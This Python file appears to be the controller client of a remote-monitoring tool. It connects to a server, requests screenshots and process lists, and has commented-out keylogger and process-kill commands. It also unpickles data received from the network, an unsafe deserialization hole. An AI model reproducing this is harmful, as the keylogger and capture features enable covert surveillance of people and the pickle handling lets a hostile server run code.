import socket
import pickle
from boltons import socketutils
from PIL import ImageGrab
import os
import wmi

PORT = 1234

class ClientServices:
    def __init__(self, server):
        self.server = server
        self.client = None
        self.buff = None
        self.DELIM = b'\x00'

    def connectServer(self):
        print('CONNECT SERVER')
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client.connect((self.server, PORT))

        self.buff = socketutils.BufferedSocket(self.client, None)

    # close connection func
    def sendCloseConection(self):
        print('SEND CLOSE SIGNAL')

        self.buff.send('close!F!'.encode())
        self.buff.close()
        self.client = None
        self.buff = None
    
    # dump func
    def recvDump(self): 
        dump_size = int(self.buff.recv_until(self.DELIM).decode())
        dump = self.buff.recv_size(dump_size)

        print(f'\tReceived dump data, size: {dump_size}')
        return pickle.loads(dump)

    # screenshoot func
    def getScreenShot(self):
        print('REQUEST SCREENSHOT')

        self.buff.send('screenshot!F!'.encode())
        return self.recvDump()

    # process list func
    def getProcessList(self):
        print('REQUEST PROCESS LIST')

        self.buff.send('processlist!F!'.encode())
        return self.recvDump()

    # # keylogger func
    # def keylogger_Start(buff):
    # buff.send('keylogger!F!'.encode())

    # def keylogger_Command(buff, cmd):
    #     buff.send(cmd.encode() + DELIM)

    # def keylogger_Send(buff):
    #     keylogger_Command(buff, 'send')
    #     return buff.recv_until(DELIM).decode()
        
    # # kill process func
    # def sendKillProcess(buff, pid):
    #     print('SEND KILL PROCESS SIGNAL')

    #     buff.send('killprocess!F!'.encode())
    #     buff.send(str(pid).encode() + DELIM)
        


    # # screenshoot func
    # def getScreenShot(buff):
    #     print('REQUEST SCREENSHOT')

    #     buff.send('screenshot!F!'.encode())
    #     return recvDump(buff)

